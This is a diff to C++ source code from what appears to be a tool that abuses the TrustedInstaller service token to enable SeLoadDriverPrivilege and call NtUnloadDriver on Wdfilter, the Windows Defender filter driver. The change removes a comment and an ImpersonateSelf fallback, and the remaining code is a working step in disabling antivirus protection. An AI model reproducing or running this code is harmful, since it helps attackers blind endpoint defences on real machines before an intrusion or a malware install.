@@ -60,7 +60,6 @@ NTSTATUS ImpersonateAndUnload()
 	}
 	else std::cout << "[+] Successfully started the TrustedInstaller service!\n";
 
-	// step 2 - find the TrustedInstaller process and get a handle to its first thread
 	auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
 	if (trustedInstPid == ERROR_FILE_NOT_FOUND)
 	{
@@ -101,19 +100,13 @@ NTSTATUS ImpersonateAndUnload()
 	// step 4 - set the SeLoadDriverPrivilege for the current thread and call NtUnloadDriver to unload Wdfilter
 	HANDLE tempHandle;
 	success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
-	if (!success && GetLastError() == ERROR_NO_TOKEN)
-	{
-		ImpersonateSelf(SecurityImpersonation);
-		std::cout << "[!] Calling ImpersonateSelf because thread is not impersonating...\n";
-		success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
-	}
-	else if (!success)
+	if (!success)
 	{
 		std::cout << "[-] Failed to open current thread token, exiting...\n";
 		return 1;
 	}
 	RAII::Handle currentToken = tempHandle;
-
+	
 	success = SetPrivilege(currentToken.GetHandle(), L"SeLoadDriverPrivilege", true);
 	if (!success) return 1;
 
